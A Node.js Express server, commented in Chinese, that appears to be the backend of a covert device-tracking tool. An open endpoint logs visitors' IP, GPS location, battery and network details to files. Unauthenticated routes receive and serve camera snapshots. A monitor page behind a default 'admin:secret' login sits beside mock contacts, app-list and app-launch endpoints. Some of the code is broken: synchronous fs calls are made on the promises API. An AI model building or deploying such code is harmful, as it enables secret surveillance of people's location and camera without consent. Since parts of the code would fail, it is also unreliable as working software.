const express = require('express');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const multer = require('multer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

require('dotenv').config();

// 配置图片存储
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const dir = path.join(__dirname, '../uploads');
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        cb(null, dir);
    },
    filename: function (req, file, cb) {
        cb(null, 'latest-camera.jpg');
    }
});

const upload = multer({ storage: storage });

class Server {
    constructor() {
        this.app = express();
        this.port = process.env.PORT || 3000;
        this.setupMiddleware();
        this.setupRoutes();
        this.setupErrorHandling();
        this.deviceData = new Map();
    }

    setupMiddleware() {
        // 基础安全设置
        this.app.use(helmet({
            contentSecurityPolicy: false
        }));
        
        // CORS设置
        this.app.use(cors({
            origin: process.env.ALLOWED_ORIGINS || '*'
        }));

        // 请求限制
        const limiter = rateLimit({
            windowMs: 15 * 60 * 1000,
            max: 100
        });
        this.app.use(limiter);

        // 日志记录
        this.app.use(morgan('combined'));

        // 请求体解析
        this.app.use(express.json());
        this.app.use(express.urlencoded({ extended: true }));

        // 静态文件服务
        this.app.use(express.static(path.join(__dirname, '../public')));
    }

    setupRoutes() {
        // 主页路由
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, '../public/index.html'));
        });

        // 监控页面 - 需要密码访问
        this.app.get('/monitor', (req, res, next) => {
            const auth = req.headers.authorization;
            if (!auth || auth !== `Basic ${Buffer.from(process.env.ADMIN_AUTH || 'admin:secret').toString('base64')}`) {
                res.set('WWW-Authenticate', 'Basic realm="Monitor Access"');
                return res.status(401).send('Authentication required');
            }
            res.sendFile(path.join(__dirname, '../public/monitor.html'));
        });

        // 追踪API
        this.app.post('/api/track', async (req, res) => {
            try {
                const clientIP = req.ip || req.connection.remoteAddress;
                const userAgent = req.headers['user-agent'];
                const parser = new UAParser(userAgent);
                const parsedUA = parser.getResult();
                const geoData = geoip.lookup(clientIP) || {};
                
                const data = {
                    device: {
                        model: parsedUA.device.model || 'Unknown',
                        os: `${parsedUA.os.name} ${parsedUA.os.version}`,
                        browser: `${parsedUA.browser.name} ${parsedUA.browser.version}`,
                        battery: req.body.battery || { level: 0 },
                        network: req.body.network || { type: 'Unknown' },
                        memory: req.body.memory || 0
                    },
                    location: {
                        lat: req.body.data?.lat || geoData.ll?.[0] || 0,
                        lon: req.body.data?.lon || geoData.ll?.[1] || 0,
                        city: geoData.city || 'Unknown',
                        country: geoData.country || 'Unknown',
                        isp: geoData.org || 'Unknown',
                        ip: clientIP
                    },
                    timestamp: new Date().toISOString()
                };
                
                this.deviceData.set(clientIP, data);
                await this.saveDeviceData(data);
                
                res.status(200).send({ status: 'ok' });
            } catch (error) {
                console.error('Error processing track request:', error);
                res.status(500).send({ status: 'error', message: error.message });
            }
        });

        // 监控API
        this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
            try {
                const clientIP = req.query.ip || req.ip;
                const deviceInfo = this.deviceData.get(clientIP) || {
                    device: {
                        model: 'Unknown',
                        os: 'Unknown',
                        browser: 'Unknown',
                        battery: { level: 0 },
                        network: { type: 'Unknown' },
                        memory: 0
                    },
                    location: {
                        lat: 0,
                        lon: 0,
                        city: 'Unknown',
                        country: 'Unknown',
                        isp: 'Unknown',
                        ip: clientIP
                    }
                };
                
                res.json(deviceInfo);
            } catch (error) {
                console.error('Error in monitor API:', error);
                res.status(500).json({ error: 'Internal server error' });
            }
        });

        // 获取应用列表
        this.app.get('/api/apps', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockApps = [
                { id: 'com.whatsapp', name: 'WhatsApp', icon: '📱' },
                { id: 'com.facebook', name: 'Facebook', icon: '👥' },
                { id: 'com.instagram', name: 'Instagram', icon: '📷' },
                { id: 'com.twitter', name: 'Twitter', icon: '🐦' },
                { id: 'com.snapchat', name: 'Snapchat', icon: '👻' }
            ];
            
            res.json(mockApps);
        });

        // 获取通讯录
        this.app.get('/api/contacts', this.authenticate.bind(this), async (req, res) => {
            const clientIP = req.query.ip;
            const deviceData = this.deviceData.get(clientIP);
            if (!deviceData) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            const mockContacts = [
                { name: '张三', phone: '138****8000', avatar: '👨' },
                { name: '李四', phone: '139****9000', avatar: '👩' },
                { name: '王五', phone: '137****7000', avatar: '🧑' }
            ];
            
            res.json(mockContacts);
        });

        // 启动应用
        this.app.post('/api/launch-app', this.authenticate.bind(this), async (req, res) => {
            const { appId } = req.body;
            const clientIP = req.query.ip;
            
            this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
            
            res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
        });

        // 处理摄像头图片上传
        this.app.post('/api/camera-update', upload.single('image'), (req, res) => {
            res.json({ success: true });
        });

        // 获取最新的摄像头图片
        this.app.get('/api/camera-image', (req, res) => {
            const imagePath = path.join(__dirname, '../uploads/latest-camera.jpg');
            if (fs.existsSync(imagePath)) {
                res.sendFile(imagePath);
            } else {
                res.status(404).send('No image available');
            }
        });
    }

    authenticate(req, res, next) {
        const auth = req.headers.authorization;
        if (!auth || auth !== `Basic ${Buffer.from(process.env.ADMIN_AUTH || 'admin:secret').toString('base64')}`) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        next();
    }

    async saveDeviceData(data) {
        try {
            const logDir = path.join(__dirname, '../logs');
            await fs.mkdir(logDir, { recursive: true });
            
            const logFile = path.join(logDir, `devices_${new Date().toISOString().split('T')[0]}.json`);
            let logs = [];
            
            try {
                const content = await fs.readFile(logFile, 'utf8');
                logs = JSON.parse(content);
            } catch (error) {
                // 文件不存在或解析错误，使用空数组
            }
            
            logs.push(data);
            await fs.writeFile(logFile, JSON.stringify(logs, null, 2));
        } catch (error) {
            console.error('Error saving device data:', error);
        }
    }

    log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] ${message}`);
    }

    setupErrorHandling() {
        this.app.use((err, req, res, next) => {
            console.error(err.stack);
            res.status(500).json({
                error: 'Internal Server Error',
                message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
            });
        });
    }

    start() {
        this.app.listen(this.port, () => {
            console.log(`Server running on port ${this.port}`);
        });
    }
}

// 启动服务器
const server = new Server();
server.start(); 
